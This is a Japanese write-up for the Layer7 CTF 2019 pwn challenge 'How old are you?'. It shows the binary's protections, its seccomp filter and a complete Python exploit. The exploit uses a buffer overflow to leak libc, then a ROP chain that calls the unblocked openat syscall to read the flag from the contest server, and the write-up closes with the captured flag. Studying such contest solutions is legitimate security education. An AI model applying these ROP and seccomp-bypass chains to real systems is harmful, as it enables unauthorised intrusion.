# [pwn 140pts] How old are you? - Layer7 CTF 2019
64ビットでPIEやSSPは無効です。
```
$ checksec -f seccomp
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   86 Symbols     No       0               4       seccomp
```
単純なバッファオーバーフローがありますが、seccompで多くのシステムコールが封じられています。
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0e 0x00 0x00000002  if (A == open) goto 0020
 0006: 0x15 0x0d 0x00 0x00000009  if (A == mmap) goto 0020
 0007: 0x15 0x0c 0x00 0x0000000a  if (A == mprotect) goto 0020
 0008: 0x15 0x0b 0x00 0x00000029  if (A == socket) goto 0020
 0009: 0x15 0x0a 0x00 0x00000038  if (A == clone) goto 0020
 0010: 0x15 0x09 0x00 0x0000003a  if (A == vfork) goto 0020
 0011: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0020
 0012: 0x15 0x07 0x00 0x0000003e  if (A == kill) goto 0020
 0013: 0x15 0x06 0x00 0x00000065  if (A == ptrace) goto 0020
 0014: 0x15 0x05 0x00 0x0000009d  if (A == prctl) goto 0020
 0015: 0x15 0x04 0x00 0x00000130  if (A == open_by_handle_at) goto 0020
 0016: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0020
 0017: 0x15 0x02 0x00 0x00000208  if (A == 0x208) goto 0020
 0018: 0x15 0x01 0x00 0x00000221  if (A == 0x221) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```
stringsするとヒントが貰えます。
```
hint is encrypted by Base64!
L2hvbWUvc2VjY29tcC9mbGFn
```
ということで、フラグは `/home/seccomp/flag` にあるようです。
openatが封じられていないのでフラグが開けそうです。
```python
from ptrlib import *

elf = ELF("./seccomp")
"""
sock = Process("./seccomp")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
"""
sock = Socket("211.239.124.246", 12403)
#sock = Socket("0.0.0.0", 9999)
libc = ELF("./libc.so.6")
#"""

rop_pop_rdi = 0x00400eb3

# libc leak
payload = b'A' * 0x118
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("main"))
sock.sendlineafter(": ", "1")
sock.sendafter(": ", "1")
sock.sendlineafter(": ", "1")
sock.sendafter(": ", payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

"""
rop_xchg_eax_ecx = libc_base + 0x000f574b
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_xchg_eax_edi = libc_base + 0x0006eacd
rop_pop_rcx_rbx = libc_base + 0x00103cca
"""
rop_xchg_eax_ecx = libc_base + 0x00107ae3
rop_pop_rdx = libc_base + 0x00001b92
rop_pop_rsi = libc_base + 0x000202e8
rop_pop_rax = libc_base + 0x00033544
rop_xchg_eax_edi = libc_base + 0x000f68bc
rop_pop_rcx_rbx = libc_base + 0x000ea69a
#"""

# get the flag
payload = b'A' * 0x118
payload += p64(rop_pop_rdx)
payload += p64(0x20)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("adult") + 1)
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(elf.plt("read"))

payload += p64(rop_pop_rsi)
payload += p64(libc_base + next(libc.find("r\0")))
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(elf.symbol("adult") + 1)
payload += p64(rop_pop_rdi)
payload += p64((0xffffffffffffffff ^ 100) + 1)
payload += p64(libc_base + libc.symbol("openat"))

#payload += p64(rop_pop_rcx_rbx)
#payload += p64(elf.symbol("adult"))
#payload += p64(0xdeadbeef)
#payload += p64(rop_xchg_eax_edi)
payload += p64(rop_pop_rdi)
payload += p64(3) # cheat
payload += p64(rop_pop_rdx)
payload += p64(0x100)
payload += p64(rop_pop_rsi)
payload += p64(elf.section(".bss") + 0x400)
payload += p64(libc_base + libc.symbol("read"))

payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss") + 0x400)
payload += p64(elf.plt("puts"))

payload += p64(elf.symbol("_start"))
payload += b'a' * (0x200 - len(payload))
sock.sendlineafter(": ", "+")
sock.sendafter(": ", " flag")
sock.sendlineafter(": ", "1")
sock.sendafter(": ", payload)

sock.send("/home/seccomp/flag")
#sock.send("./flag.txt")

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to 211.239.124.246:12403
[+] <module>: libc base = 0x7f593ca74000
[ptrlib]$ Okay! I know how you are now, baby :)
LAYER7{H3110_MY_NAM3_1S_OP3NAT!_AND_HOW_0LD_AR3_Y00o0o00o0o0o0ooooooo0000000000000000OOOOOOOOO00UuuuuUUUUUUUUuuuuuuuUUUU??!?!?!?!!!11111?!11111?11?}
Input your age :
```

# 感想
簡単ですね。